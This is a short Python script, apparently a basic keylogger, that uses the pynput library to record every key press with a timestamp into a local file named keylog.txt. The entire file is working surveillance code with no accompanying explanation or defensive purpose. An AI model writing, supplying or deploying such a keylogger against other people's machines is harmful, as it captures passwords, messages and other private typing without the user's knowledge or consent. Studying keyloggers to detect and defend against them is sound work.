from pynput.keyboard import Listener, Key
import logging

logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
def on_press(key):
    logging.info(str(key))
 
with Listener(on_press=on_press) as listener :
    listener.join()
